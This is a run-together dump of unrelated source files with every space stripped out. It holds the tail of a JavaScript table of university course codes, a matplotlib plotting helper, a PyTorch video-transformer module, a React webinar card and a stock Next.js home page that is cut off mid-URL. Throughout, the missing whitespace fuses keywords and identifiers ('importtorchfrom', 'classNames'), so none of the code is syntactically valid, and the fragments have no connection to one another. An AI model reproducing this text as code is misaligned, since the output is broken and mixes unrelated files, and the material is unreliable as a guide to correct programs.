','39F','39M','160D','70A','39I','39Y','39K','39A','124','40C','39B','191A','39O','23','39C','24','1W','128','1','39Z','199','39U','191B','39D','160B','39N','180B','39Q','88','122','39'],'MATH':['106','121A','270','128B','229','249','116','39A','16B','253','10B','224A','10A','53','105','272','225B','224B','196','252','141','240','602','220','99','98','51','140','212','299','242','228B','115','55','208','206','98BC','222B','250A','261A','135','123','222A','276','295','127','199','113','172','245A','152','160','236','128A','204','228A','130','250B','205','151','136','273','215B','290','143','56','142','197','195','277','104','52','275','227A','214','3','198BC','255','191','261B','254A','121B','202B','239','198','24','74','126','125A','185','302','114','256A','189','235A','54','256B','202A','219','303','49','257','156','209','91','215A','170','16A','279','274','251','254B','221','241','278','301','258','124','600','96','110','225A','118','1'],'MATSCI':['296A','215','260','296B','198','201B','375B','45','111','125','228','24','130','120','121','201A','104','204D','218','202','243','159','199','205','131','151','290A','299','200A','45L','224','140','217','127','104L','195','223','103','602','241','122','242','136','117','213','102','290M','123','375A','251','129','601','204','112','298','113'],'MBA':['292J','263','296','204','236T','247','295I','282','262','275','297A','297F','255X','294','236H','270','299H','212C','224A','236K','299B','236L','298B','268D','259','290T','293C','273','250','269','291I','256','292F','255','251A','246A','265','297B','236F','222','290N','291D','214','212A','291E','291C','298X','209F','299E','297C','200S','283','299M','236B','295C','215','236M','201B','292ID','295B','240','257','264','290H','291T','285','236E','295F','202','236C','292A','206','210','237','292S','261','277','292IL','209','375','268C','284','286','295A','200P','293','248A','292K','200C','236J','243','292M','212','295M','207','203','266','200D','298S','209P','291R','268B','253','280','292T','246','295S','212B','262A','295N','211','278','292R','291F','200A','291L','258','292L','236D','295T','233','298A','254','296C','287','229','205','271','291S','292C','297D','260','295G','290K','255G','267','219','231','217','236V','201A','292B','232','205D','252','292H','292D','223','236G','236I'],'MCELLBI':['218Q','249Y','269D','239M','136','170L','290','239D','259N','481C','259C','220','239BB','141','601','143','249K','201B','219Y','218C','239HH','293A','269C','276','280C','249J','200A','239Z','239J','239K','229N','229A','239W','280E','250','296','269J','602','269Q','269R','249MM','249G','15','153L','239G','199','269N','291B','249O','239P','293C','249W','249D','259F','229K','269E','294','239KK','180C','197','259E','229B','110','259M','120','249C','229E','239F','218I','229H','104','135A','219B','259H','149','269K','168','291A','198','259D','259K','191','280B','259P','219A','249H','239S','84B','229J','120L','240','206','100B','293S','249HH','227','150','239T','218F','380','269T','219U','229L','249M','201A','153','275','259O','239EE','249BB','229F','280D','55','288','229D','269P','229C','239I','218P','239V','239R','259A','239O','218O','249A','219Z','102','180','280A','269O','219K','231','140','269G','269M','249R','293R','218M','230','295','32L','150L','249F','229I','98','289','219H','218T','41','50','249Z','194','239C','238','229M','269I','375','32','239Q','269W','218U','249Q','481B','88','210','229G','218V','218H','137L','237L','239FF','218J','292','259J','219S','200B','236','280F','218B','132','38','133L','218X','249P','140L','249T','293D','249I','24','269F','259G','218S','251','99','239U','249V'],'MECENG':['285C','132','219','241A','126','276DS','193D','292K','193E','127','197','285B','284','193B','258','260A','119','102B','292E','193I','153','277','290KB','172','259','138','133','103','140','110','203','274','226','280B','164','163','275','151','290V','292J','206','290J','220','238','224A','285A','290N','234','290T','190Y','297','224','120','256','168','249','193F','299','253','280A','136SL','239','250A','263Z','292G','290P','174','101','266','165','282','289','273','252','292H','125','227','233','109','246','251','179','150A','154','288','150','237','135','260B','130','198','292B','292F','175','160','290U','290I','286','290Q','248','290R','118','173','241B','131','292I','236C','204','285D','272','298','375','262','136HL','290G','242','151A','193J','106','191K','245','230B','211','235','250B','170','185','193K','270','193A','24','122','236U','218N','199','193H','108','290M','236SL','236HL','292A','136','40','229','290KA','193C','146','290L','271','167','240B','283','190M','221','206A','287','104','230A','196','240A','98','254','292D','151B','193G','290C','139','226L','190L','255','290H','257','292C','290D','100','263','243','281'],'MEDIAST':['111B','101','103','198','160','175','132','190','168','104B','131','24','150','130','10','138','111C','113','112','104D','170','180','165','199','84','111','140','114','104A','39','104E'],'MEDST':['210','150','205','250','200'],'MELC':['290C','192C','290A','180','192F','123','375','148','223','159','131','135','138','25','154','101','193','192I','103','192B','99','10','171','141','291','299','190E','601','161','128','163','602','202','18','290E','298','153','125','192A','146','200','190C','111','290H','143','192','124','190I','198','126','151','136','140','181','114','133','192G','137','142','34','190D','165','39A','145','162','102','152','290G','174','104','132','190H','160','192D','118','170','144','292','192H','192E','115','105','205','129','190B','149','110','24','156','290D','113','173','108','158AC','296','190A','98','134','187','119','147','297','139','150A','127','109','112','117','155','290B','11','192K','116','192J','175','122','130','157','290F','150B','199'],'MESTU':['120','199','102','98','109','20','24','10','190','198','130','150'],'MFE':['230P','230Q','230VA','230K','230H','230I','230ZB','230M','230V','230X','230J','230W','230D','230ZA','230O','230E','230G','230GA','230GB','230R','230T','230VB','230S','230Y','230A','230N','293'],'MILAFF':['145A','199','180','1','145B'],'MILSCI':['431','2','132','1','432','141','3','142','100','131','101'],'MONGOLN':['298','110','116','299','601','199','602','1A','99','1B','98','118','198'],'MPS':['1','375'],'MUSIC':['108','258B','14','168E','128TM','198','180','41A','172','97','144','202','142','198BC','197','128SM','162','109','163','45','204','141','167I','168G','99','150B','158A','168I','138','25','156','154B','108M','128R','131C','109M','151B','210','131B','246','157B','52B','52A','98','165','139','170','44','207','228','167C','131','601','234','128A','45M','106','151D','200C','134C','151C','128Q','116','300','128T','40','195','220','290','158B','26AC','31','20','80','128V','161B','24','107','128DM','98BC','133C','298','170A','296','128E','155','168C','168B','168H','209','258A','90','39M','128B','150A','30','140','48','41B','244A','134D','154A','157A','168A','105','167B','161A','28','148','166A','128S','128D','188','45A','133D','167H','146B','168CS','299','143','150','41C','128AM','27','128RM','602','152B','179','167A','247','29','130B','164','132','231','150C','208A','128VM','128BM','168CE','233','232','128ZM','244B','135A','151A','128X','128','245','249','168D','46','201A','203','166B','128Z','159','57','42','70','149','199','200B','135','152A','145'],'NATAMST':['20A','151','158','178','167','198','20B','160','195','120','172','90','71','164','163','100','39','161','99','120AC','150','199','101','39A','162','102','179','149','72','175','165','98','145','190','110','197','170','178AC','105','173','194A','194B','173AC','176','97'],'NATRES':['199S','76','39','39E','84','24'],'NAVSCI':['1','20','154','400C','412','10','2','401','400E','12A','3','12B','400D'],'NESTUD':['130A'],'NEU':['100A','210A','100B','291B','77','210B','291A','165','99','250','24','172L','191','173L','164','152','61','128','110','292','295','296','290','198','171L','63','242','199','162','273','197','271','65','98','294'],'NORWEGN':['1A','1B'],'NSE':['298','290'],'NUCENG':['290C','290D','220','256M','120','265','255','156','170A','24','299','281','290A','260','180','175','220M','201','101','155','215M','295','107','104','290F','225','102','290E','261M','207','280','130','270','262','162','290B','375','221','267','250','198','275','200M','204','224','211M','10','170B','167','602','124','161','199','210M','298','150','230','100'],'NUSCTX':['161B','293','296H','108A','166','115','190','105','296J','296G','20','260','208','296B','104','135','30','298','199S','299','290','211A','108B','110','266','10S','171','296A','296F','11','220','235','375','194','245','199','193','170','302','161A','602','160','296C','145','250','103','296K','104AC','98','292','210','10','200','261','24','201','400','262','192','121','296I','295','211B','296D','197','120','198','296E','296L','294'],'NWMEDIA':['201','90','151AC','198','150AC','204','191','202','131','290','197','104','200','299','291','39A','205','190','123'],'OPTOM':['260A','441C','272A','430B','281A','226B','215','10','292A','246','440B','203A','200BL','222B','452','236B','200F','298A','440C','298B','441A','432','435','205','450B','200E','430A','200CL','230B','440A','291A','231B','39B','490A','271B','198','490B','203B','84','206B','200B','206D','200DL','98','299A','450A','200AL','222A','206A','270C','291B','200A','241','441B','200C','240','226A','430C','236A','251','200D','231A','217','292B','499','271A','281B','256','299B','230A','219','213'],'PACS':['135','98','125AC','24','130','94','150','151','119','195','100','170','198','150AC','154','149','127','126','159','10','128AC','190','197','199'],'PBHLTH':['147','206C','210J','299','272AW','288C','220E','271K','150A','210B','260A','224W','298','162A','271D','222A','226C','155B','375A','110A','220','210K','210','266B','236','220C','218B','214','252E','266C','150B','241W','112','227AW','259B','219E','253B','225BW','270A','200J','252C','150D','271E','267W','245','224A','200A','209A','219C','132','263','215','253G','253W','258W','291','288D','104B','271J','200','261','226CW','250W','126','243C','202W','221','271H','218W','202B','207A','216A','249','107','254','292','124','231A','237D','223E','224D','243A','14N','207','257','290AW','206BW','200K','217C','170C','237A','210F','265','250C','289W','266D','198','252AW','271G','269AW','205W','237C','211','15','142','278','375B','226A','227A','256','129','237E','275','237B','258','101','223C','196','262','243D','210D','206AW','273','206B','251C','250A','235','243B','180','209W','290B','207AW','118','130','252D','202L','204A','155C','167','182','108','267B','144B','210E','257W','226D','200EW','260F','177A','141','209B','270','203A','277A','226FW','260B','155A','24','204W','200FW','241','205','236AW','224E','200GW','212A','268W','252','255D','219W','252W','220D','290','206','199','223D','206D','250B','222AW','293','142W','201E','285A','221B','270B','297','290C','168','226AW','251W','155D','260C','237F','260W','212W','291A','204G','197','270C','281','145','200L','98','251D','99','223W','188','144A','220MW','84','150E','266A','291C','202G','264','196A','272CW','213A','213W','252B','253D','116','225AW','181','271C','244','255A','226B','255C','155E','115','269D','251BW','269E','260E'],'PERSIAN':['198','103B','200B','11B','104B','200A','20B','10','102A','20','100B','102B','103A','101B','20A','202B','101A','11A','199','301A','120','202A','1A','100A','104A','298','50','1B','105'],'PHDBA':['259A','279S','375','239E','239FA','269E','229B','259B','279PB','259E','279PD','269D','249C','219S','297T','229S','297B','249A','297A','279PC','602C','239S','602','289A','269S','279PA','299A','229A','249B','269C','269A','259S','269B','259C','289S','229D','229C','239FB','239FC'],'PHILOS':['186B','114','160','142','11','108','149','2','153','98','146','172','127','161','4','198BC','12A','189','299','5','143','3','178','190','132','16','144','19','151','295','290','13','141','104','84','119','163','173','183','185','138','136','115','109','128','199','17','186','129','25A','39','121','171','18','6','198','110','188','187','170','98BC','133','156A','125','140A','24','301','7','184','122','126','10','116','375','117AC','14','25B','107','135','134','154','9','140B','200','100','106','155','176','148','112','181'],'PHYSED':['177','11','47B','12','3','60','47A','98','4','121','64','5','2','198','1','32','130','197'],'PHYSICS':['226','8A','205A','142','99','240B','10','290H','238B','242A','234B','21','198F','141B','233A','205B','290L','5C','238A','232B','129','288','141A','290I','212','295','137B','216','112','221A','98','5BL','89','301','100','7C','233B','221B','211','88','290E','49','290S','250','290Z','297','24','290J','198BC','251','77','290T','137A','7B','209','290N','375','111A','5B','105','177','151','234A','130','139','198','290P','290D','240A','39','700','290B','8B','290F','111B','290Q','153','229','230','110A','231','290K','299','290G','188','7A','290X','232A','602','290R','5CL','98BC','242B','290A','290Y','5A','138','199','110B'],'PLANTBI':['222','220A','200C','177','297','120L','10','40','220F','202','101L','292','220D','160','220B','238','13','200F','98','104L','199','150','122','375','205B','198','200A','290','39','299','11','200E','210','296','200B','84','22','205A','200D','120','190','220C','199S','185','24','170','602','220E','180','135','298','113','99','20','201','165','39E'],'POLECON':['157','198','156','107','192','106','196','101','160','85','140','130','158','98','162','84','100','111','154','194','199','24','197','159','133','155','150'],'POLISH':['25A','115A','115B','25B'],'POLSCI':['149E','84','139M','144B','261','133','211A','109','272','222','244D','123L','167','215B','186','404','221','109H','1','247A','105','109R','227','244A','291AS','157A','269','290IC','123G','169','290','150','149S','116R','123S','143E','138Z','232H','116O','196S','273','140Z','140O','259','111AC','140F','123','146D','122A','124D','291','109M','124A','128','149W','112A','123A','138M','239','116H','148A','2','109L','245B','223','257','209A','157B','138D','109B','296','164A','252','211','228','279','142A','103','112D','116W','299','231C','117L','124G','290PB','200A','212C','147T','149B','192','147G','5','116J','226A','116L','171','143A','116A','225A','106A','109E','116','200B','263','123J','146A','116Q','231A','289','147F','149K','116M','88','161','109W','143C','114A','149','248A','138S','149M','290SA','124H','235','123R','291F','166','398','116V','203','244C','116E','138F','216','198BC','245A','224','103W','262','196','116Y','149P','140S','112C','375','140M','141A','249B','197S','212B','123M','116D','109G','98BC','124B','290CP','292','291T','201D','204B','181','126A','215A','167AC','144','116Z','18AC','271','123P','231B','212A','199','217','149F','124M','112L','236B','220A','214','291IR','149N','232A','3','198','143B','204','116G','274','249C','290B','230','140R','116P','280A','41','246B','214A','118AC','232B','140W','602','112B','196W','116T','139B','239T','197','152A','117D','123F','247G','24','140E','4','137A','109Q','201A','243C','140L','123H','210','138G','145B','109D','116S','179','138E','116C','225','139D','207','123Y','132B','206','213','104','109S','290A','116F','236A','143T','243B','123W','109Z','132C','117','141C','149R','99','138C','201B','209B','109A','109P','250','284','98','173S','123C','234A','116N','124C','116B','116I','191','249A','128A','102','290PI','116X','175A','116K','202A','116U','110B','145A','149I','41C','125','39B'],'PORTUG':['104','135','115','128','102','113','375','275','298','103','27','120','24','199','50','299','107'],'PSYCH':['166AC','132','162','124','149','229','99','237E','299','140','205','134','233B','208','181','198','171','197','102','214','115','250A','39L','138','137','209','204','237S','114','150','101D','206','180','269','133','1','142','301','149A','70','14','234D','118','230A','39E','230','62','169','192AC','121','158','233A','131','141','164','260A','128','106','240B','9','401B','294','207','375','192','110','602','130','130M','3','168','109','148','235','229B','290B','260B','237G','7','8','117','199','290J','39M','240A','39J','290Q','290K','39K','290Z','98','163','125','229A','18','24','249','293','167AC','259','22','210B','6','139','160','149C','84','230B','147','298','170','192P','239','144','232','2','136','149D','101','88','172','237H','156','236','401A','292','230C','5','135','4','290H','39I','149B','145','290E','290I','173','250B','231','237F','250D'],'PUBAFF':['235','285','280','290','205','283','207','270','288','245','215','287','201','260','265','274','202','225','271','255'],'PUBPOL':['295','269','98','235','217','249','101','162AC','237','105','279','24','200B','230','259','210A','375','236','296','199','270','282','165','117AC','280','210B','240C','160AC','200','298','220','250','224','290','232','275','39B','246','257','268','288','192AC','297','240B','155','187','190','103','240A','299','141','132','286','251','287','200A','198','267','157','283','273','265','292','156','263','271','229','205','255','256','260'],'PUNJABI':['15','1A','100A','100B','1B'],'RDEV':['209','280','235','250','200','205','260','290','210','240','225','270','215','220','297','285','277'],'RELIGST':['90B','24','190','173AC','198','90A','199'],'RHETOR':['111','128T','124','189A','244','30','130','197','103A','50','123','165','152','155','121','173','100','98','107','295','157A','117','230','250','39','133T','170','110','60','220','158','22','39I','205','10','159A','601','137','167','160','138','127','113','375','302','157B','120','240G','152AC','109','129AC','112','139','240E','135T','182','104','132T','118','240D','122','166','153','2','116','119','240','163','164','136','184','299','243','151','145','105T','115','114','20','240F','24','602','199','171','106','168','189','129','200','156','172','103B','159B','108','198','131T','125','176','150','221'],'RUSSIAN':['204','6A','6B','10','103A','1','105B','20','120B','106B','101','105A','3','2','106A','109','201','120A','102','103B','202','4'],'SANSKR':['101A','206','200B','101B','207','100B','200A','100A','203','101C'],'SASIAN':['240','110','125','147','1B','128','100A','131','123','144','140','122','148','121','1A','136','124','100B','127','118','146','142'],'SCANDIN':['204','24','120','299','165','240','149','301','125','375','206','300A','300B','198','60','101B','116','201B','145','199','98','215','188','235','191AC','180','170','123','100A','100B','101A','602','106','201A','160','220','132','297','250','298','249','75','115','601','127','150'],'SCMATHE':['295','299','220C','210','602','292','294'],'SEASIAN':['166','188','175','167','101B','162','101A','129','160','152','138','165','148','130','150','10A','190','128','170','121','10B','154','137'],'SEMITIC':['209B','205A','100A','205B','209A','101','100B'],'SLAVIC':['191','134C','140','200','175','246B','245B','46','133','39E','147A','246A','223','50','231','100R','99','134N','39L','131','151','214','178','256','248','148AC','234','100','199','39M','222','230','36','375B','601','98','171','139','287','245A','147B','210','49AC','182','285','158','39','298','198','39N','150','375A','282','24','602','242','39C','134G','134F','181','45','239','138','247A','134A','190','134E','220','130','170','134D','301','280','148','132','258','299','281','100L','172','174','188','243','310'],'SOCIOL':['299','180P','271C','114','205K','601','189G','3AC','115B','292','142','131','280R','194','202C','186','146','290','205D','145L','205B','205F','280N','113AC','102','292W','24','292D','280P','280A','280EE','113','280J','169','120','280S','273I','124','116AC','139H','273A','146AC','182','280AA','122','280X','273C','275','135','145','111P','205G','152','145AC','169F','149P','136','104','105','130','139F','205N','5','127','280F','296','280DD','202A','98','205E','273E','295','202B','271B','280D','205A','199','106','205P','115G','7','271A','139','193','286','88','205R','163','197','141','179','205Q','180E','280E','98BC','280L','280Q','273D','133','1','112','201B','205I','108','101','301','131F','180I','205J','205O','198','150','190AC','103','273L','205H','165','144','205L','180C','205V','298','110','166','185','116','205U','205C','111C','111L','280M','111','111AC','167','169C','160','140','280W','375','280C','119S','131AC','285','280G','117','190','148','130AC','107','280V','201A','602','189','121','173','280Y','200','205T','273F','280I','152AC','205S','280K','205M','120T','271D','273M','280Z','280H','280B','198BC','149','119L'],'SOCWEL':['291','401','198BC','255','250A','250M','199','244','282B','116','150AC','197','98BC','402','287','120','410B','210A','290B','252','250Z','250B','265L','294','210B','250I','250X','250T','272','295','98','254','251','105','220','289A','114','301','198','290A','250C','97','241A','298','250J','293','410A','232','210C','200','243','403','299C','250K','280','241B','412B','265M','292B','260','265N','241','245','260A','250N','148','10','296','250L','412A','110','257','181','205','274','250Y','240','107','176AC','292A','265T','250U','186','210I','375','282A','265H','125','150L','212','299','246','116H','174','112','279','230','275','238C'],'SPANISH':['21','221','111A','40D','24','40F','229','234A','299','100','4','111B','224','107B','40C','25','198','39','179','201','162','200A','302','242','104B','112','135','163','107A','32','280','109B','101','30','197','122','166','40B','285','260','104A','40A','16','135AC','22','2','232','142','102C','135W','98','209','199','109A','164','1','223','3','165','601','161','40E','121','123','375','102A','131','115','602','298'],'SSEASN':['98A','294','140N','198E','199A','199','250','198A','198B','602F','198D','84','290E','199C','601F','601E','290F','149','602B','190','375','299D','601B','290C','601C','39','299B','290A','602D','50','299F','602A','290B','199D','24','601D','290D','602C','198C','602E','120','299C','199F','198F','199E','601A','99A','199B','299E','299A'],'STAT':['33A','240','135','259','212A','602','165','154','260','159','201A','251','39D','201B','272','134','157','200A','210B','150','265','151A','375','254','198','700','94','298','97','222','199','212B','244','239A','239B','248','204','200B','210A','24','238','601','2','215A','98','243','230A','152','155','278B','21','197','156','89A','215B','0PX','153','20','232','256','299','158','214','33B','133'],'STRELIG':['200','203','201','202'],'SWEDISH':['1A','1B'],'TAMIL':['210B','1A','101A','101B','210A','1B'],'TELUGU':['1A','1B'],'THAI':['101B','1B','100A','100B','101A','1A'],'THEATER':['112','171','146B','24','151A','151','203','125D','172','180','139B','294','181','602','45','200A','162','113','173','168','375','197','201A','200B','169','14','26','140','178','167','105','125','148','110A','141','146A','201B','190','104','126','5','115','113B','174','196','199','202','114','151B','52AC','25AC','277','118AC','60','121','20U','177','142','119','66','300','175B','98','166','266','144','179','113A','145','147A','147B','198','10','84','117AC','40','110B','175A','111','143','109','100','99','163','139A','340','176','39','160','299'],'TIBETAN':['1B','118','299','601','24','1A','100S','84','10B','602','116','119','110A','298','10A','110B','115'],'TURKISH':['100B','100A','1A','298','101A','198','101B','10','199','1B'],'UGBA':['184','101B','192F','194S','190C','179G','135','192N','117','146','196','167','192E','120AA','199','151A','192T','180','102B','147','192MC','150','39E','192P','168B','157','198','103','192ID','183','137','161','120AB','192A','98','39AC','132','151','195T','125','169','154','192L','102A','173','191C','24','192PF','192B','175','162A','118','101A','171','195S','195B','193B','131A','127','13','192G','178','156','193C','88','106','193I','176','165','162','123','190D','122','194','192H','143','133','192AC','195M','78G','107','191L','96','100','128','39','105','120B','131','104','159','141','190S','187','196SC','84','136F','134','126','190T','10X','142','191I','179','195P','196SA','152','174','164','160','196SB','192S','155','177','191P','121','195A'],'UGIS':['110','160A','82T','162Q','162Z','58','172C','303','39B','81A','156','113','162D','165','140','192E','192D','176B','192C','162S','304','192B','162V','176','162F','187','80A','177','81B','162R','175','162N','162O','82','162X','162G','189','162A','98','5A','80B','162M','162H','82S','162C','112','39','120','162B','190','196N','192A','176A','173','82M','198','162I','162E'],'UKRAINI':['160','1B','1A','100','168'],'URDU':['1B','1A','100B','101B','100A','101A'],'VIETNMS':['100A','15','101A','1B','100B','101B','1A','101'],'VISSCI':['201A','199','601','375A','230','260D','375B','39','602','299','298','201B','260A','260C','24','260B','206C','300','262','265','84'],'VISSTD':['187B','299','298','199','186','186X','181','197','180A','187A','185X','198','180B','186A','280','186B'],'XAFRICA':['98'],'XAGRS':['10A'],'XAMRSTD':['10'],'XANTHRO':['1'],'XART':['98'],'XASAMST':['20AC'],'XASTRON':['10'],'XEPS':['20','80'],'XESPM':['50AC','15'],'XETHSTD':['197','21AC'],'XFILM':['50'],'XGEOG':['72AC','30','4','50AC'],'XGLOBAL':['10B'],'XGWS':['50AC','10'],'XHISTAR':['11','10'],'XHISTOR':['7B','30'],'XINTEGB':['33','31'],'XLINGUI':['55AC'],'XMATH':['32','1B','1A','10A','16A'],'XMBA':['237','205','201B','291R','247','291L','255','298A','298I','267','277','296','295G','211','236M','295I','291RB','254','295A','252','201A','292T','200C','290P','206','236V','236E','253','295T','291RA','231','257','203','209','212','200S','290T','295S','293','217','291T','202','204'],'XMCELLB':['32'],'XMUSIC':['27','26AC'],'XPHILOS':['2','3'],'XPOLSCI':['2','5','1'],'XPSYCH':['1'],'XRHETOR':['2'],'XSOCIOL':['3AC','1'],'XSTAT':['2'],'XTHEATR':['52AC'],'YIDDISH':['104','101','103','107','106','101A','105','102']}exportdefaultcourses;importmatplotlib.pyplotaspltdefplot_points(points):x,y=zip(*points)fig,ax=plt.subplots()ax.scatter(x,y)returnfig,axdefplot_circles_and_points(circles,points):fig,ax=plt.subplots()forcircleincircles:ax.add_patch(plt.Circle((circle.x,circle.y),circle.r,fill=False))x,y=zip(*points)ax.scatter(x,y)returnfig,aximporttorchfrom..modules.attentionimport*from..modules.diffusionmodules.utilimport(AlphaBlender,linear,timestep_embedding)classTimeMixSequential(nn.Sequential):defforward(self,x,context=None,timesteps=None):forlayerinself:x=layer(x,context,timesteps)returnxclassVideoTransformerBlock(nn.Module):ATTENTION_MODES={"softmax":CrossAttention,"softmax-xformers":MemoryEfficientCrossAttention,}def__init__(self,dim,n_heads,d_head,dropout=0.0,context_dim=None,gated_ff=True,checkpoint=True,timesteps=None,ff_in=False,inner_dim=None,attn_mode="softmax",disable_self_attn=False,disable_temporal_crossattention=False,switch_temporal_ca_to_sa=False,):super().__init__()attn_cls=self.ATTENTION_MODES[attn_mode]self.ff_in=ff_inorinner_dimisnotNoneifinner_dimisNone:inner_dim=dimassertint(n_heads*d_head)==inner_dimself.is_res=inner_dim==dimifself.ff_in:self.norm_in=nn.LayerNorm(dim)self.ff_in=FeedForward(dim,dim_out=inner_dim,dropout=dropout,glu=gated_ff)self.timesteps=timestepsself.disable_self_attn=disable_self_attnifself.disable_self_attn:self.attn1=attn_cls(query_dim=inner_dim,heads=n_heads,dim_head=d_head,context_dim=context_dim,dropout=dropout,)#isacross-attentionelse:self.attn1=attn_cls(query_dim=inner_dim,heads=n_heads,dim_head=d_head,dropout=dropout)#isaself-attentionself.ff=FeedForward(inner_dim,dim_out=dim,dropout=dropout,glu=gated_ff)ifdisable_temporal_crossattention:ifswitch_temporal_ca_to_sa:raiseValueErrorelse:self.attn2=Noneelse:self.norm2=nn.LayerNorm(inner_dim)ifswitch_temporal_ca_to_sa:self.attn2=attn_cls(query_dim=inner_dim,heads=n_heads,dim_head=d_head,dropout=dropout)#isaself-attentionelse:self.attn2=attn_cls(query_dim=inner_dim,context_dim=context_dim,heads=n_heads,dim_head=d_head,dropout=dropout,)#isself-attnifcontextisnoneself.norm1=nn.LayerNorm(inner_dim)self.norm3=nn.LayerNorm(inner_dim)self.switch_temporal_ca_to_sa=switch_temporal_ca_to_saself.checkpoint=checkpointifself.checkpoint:print(f"{self.__class__.__name__}isusingcheckpointing")defforward(self,x:torch.Tensor,context:torch.Tensor=None,timesteps:int=None)->torch.Tensor:ifself.checkpoint:returncheckpoint(self._forward,x,context,timesteps)else:returnself._forward(x,context,timesteps=timesteps)def_forward(self,x,context=None,timesteps=None):assertself.timestepsortimestepsassertnot(self.timestepsandtimesteps)orself.timesteps==timestepstimesteps=self.timestepsortimestepsB,S,C=x.shapex=rearrange(x,"(bt)sc->(bs)tc",t=timesteps)ifself.ff_in:x_skip=xx=self.ff_in(self.norm_in(x))ifself.is_res:x+=x_skipifself.disable_self_attn:x=self.attn1(self.norm1(x),context=context)+xelse:x=self.attn1(self.norm1(x))+xifself.attn2isnotNone:ifself.switch_temporal_ca_to_sa:x=self.attn2(self.norm2(x))+xelse:x=self.attn2(self.norm2(x),context=context)+xx_skip=xx=self.ff(self.norm3(x))ifself.is_res:x+=x_skipx=rearrange(x,"(bs)tc->(bt)sc",s=S,b=B//timesteps,c=C,t=timesteps)returnxdefget_last_layer(self):returnself.ff.net[-1].weightclassSpatialVideoTransformer(SpatialTransformer):def__init__(self,in_channels,n_heads,d_head,depth=1,dropout=0.0,use_linear=False,context_dim=None,use_spatial_context=False,timesteps=None,merge_strategy:str="fixed",merge_factor:float=0.5,time_context_dim=None,ff_in=False,checkpoint=False,time_depth=1,attn_mode="softmax",disable_self_attn=False,disable_temporal_crossattention=False,max_time_embed_period:int=10000,):super().__init__(in_channels,n_heads,d_head,depth=depth,dropout=dropout,attn_type=attn_mode,use_checkpoint=checkpoint,context_dim=context_dim,use_linear=use_linear,disable_self_attn=disable_self_attn,)self.time_depth=time_depthself.depth=depthself.max_time_embed_period=max_time_embed_periodtime_mix_d_head=d_headn_time_mix_heads=n_headstime_mix_inner_dim=int(time_mix_d_head*n_time_mix_heads)inner_dim=n_heads*d_headifuse_spatial_context:time_context_dim=context_dimself.time_stack=nn.ModuleList([VideoTransformerBlock(inner_dim,n_time_mix_heads,time_mix_d_head,dropout=dropout,context_dim=time_context_dim,timesteps=timesteps,checkpoint=checkpoint,ff_in=ff_in,inner_dim=time_mix_inner_dim,attn_mode=attn_mode,disable_self_attn=disable_self_attn,disable_temporal_crossattention=disable_temporal_crossattention,)for_inrange(self.depth)])assertlen(self.time_stack)==len(self.transformer_blocks)self.use_spatial_context=use_spatial_contextself.in_channels=in_channelstime_embed_dim=self.in_channels*4self.time_pos_embed=nn.Sequential(linear(self.in_channels,time_embed_dim),nn.SiLU(),linear(time_embed_dim,self.in_channels),)self.time_mixer=AlphaBlender(alpha=merge_factor,merge_strategy=merge_strategy)defforward(self,x:torch.Tensor,context:Optional[torch.Tensor]=None,time_context:Optional[torch.Tensor]=None,timesteps:Optional[int]=None,image_only_indicator:Optional[torch.Tensor]=None,)->torch.Tensor:_,_,h,w=x.shapex_in=xspatial_context=Noneifexists(context):spatial_context=contextifself.use_spatial_context:assert(context.ndim==3),f"ndimsofspatialcontextshouldbe3butare{context.ndim}"time_context=contexttime_context_first_timestep=time_context[::timesteps]time_context=repeat(time_context_first_timestep,"b...->(bn)...",n=h*w)eliftime_contextisnotNoneandnotself.use_spatial_context:time_context=repeat(time_context,"b...->(bn)...",n=h*w)iftime_context.ndim==2:time_context=rearrange(time_context,"bc->b1c")x=self.norm(x)ifnotself.use_linear:x=self.proj_in(x)x=rearrange(x,"bchw->b(hw)c")ifself.use_linear:x=self.proj_in(x)num_frames=torch.arange(timesteps,device=x.device)num_frames=repeat(num_frames,"t->bt",b=x.shape[0]//timesteps)num_frames=rearrange(num_frames,"bt->(bt)")t_emb=timestep_embedding(num_frames,self.in_channels,repeat_only=False,max_period=self.max_time_embed_period,)emb=self.time_pos_embed(t_emb)emb=emb[:,None,:]forit_,(block,mix_block)inenumerate(zip(self.transformer_blocks,self.time_stack)):x=block(x,context=spatial_context,)x_mix=xx_mix=x_mix+embx_mix=mix_block(x_mix,context=time_context,timesteps=timesteps)x=self.time_mixer(x_spatial=x,x_temporal=x_mix,image_only_indicator=image_only_indicator,)ifself.use_linear:x=self.proj_out(x)x=rearrange(x,"b(hw)c->bchw",h=h,w=w)ifnotself.use_linear:x=self.proj_out(x)out=x+x_inreturnoutconstHorizontalWebinarGridItem=({webinar})=>{return(<divclassName='bg-gray-200p-4rounded-lgw-60flex-shrink-0'><h4className='font-semibold'>{webinar.title}</h4><pclassName='text-sm'>{webinar.description}</p></div>);}exportdefaultHorizontalWebinarGridItem;importImagefrom"next/image";exportdefaultfunctionHome(){return(<divclassName="gridgrid-rows-[20px_1fr_20px]items-centerjustify-items-centermin-h-screenp-8pb-20gap-16sm:p-20font-[family-name:var(--font-geist-sans)]"><mainclassName="flexflex-colgap-8row-start-2items-centersm:items-start"><ImageclassName="dark:invert"src="https://nextjs.org/icons/next.svg"alt="Next.jslogo"width={180}height={38}priority/><olclassName="list-insidelist-decimaltext-smtext-centersm:text-leftfont-[family-name:var(--font-geist-mono)]"><liclassName="mb-2">Getstartedbyediting{""}<codeclassName="bg-black/[.05]dark:bg-white/[.06]px-1py-0.5roundedfont-semibold">app/page.js</code>.</li><li>Saveandseeyourchangesinstantly.</li></ol><divclassName="flexgap-4items-centerflex-colsm:flex-row"><aclassName="rounded-fullborderborder-solidborder-transparenttransition-colorsflexitems-centerjustify-centerbg-foregroundtext-backgroundgap-2hover:bg-[#383838]dark:hover:bg-[#ccc]text-smsm:text-baseh-10sm:h-12px-4sm:px-5"href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"target="_blank"rel="noopenernoreferrer"><ImageclassName="dark:invert"src="https://nextjs.org/icons/vercel.svg"alt="Vercellogomark"width={20}height={20}/>Deploynow</a><aclassName="rounded-fullborderborder-solidborder-black/[.08]dark:border-white/[.145]transition-colorsflexitems-centerjustify-centerhover:bg-[#f2f2f2]dark:hover:bg-[#1a1a1a]hover:border-transparenttext-smsm:text-baseh-10sm:h-12px-4sm:px-5sm:min-w-44"href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"target="_blank"rel="noopenernoreferrer">Readourdocs</a></div></main><footerclassName="row-start-3flexgap-6flex-wrapitems-centerjustify-center"><aclassName="flexitems-centergap-2hover:underlinehover:underline-offset-4"href="http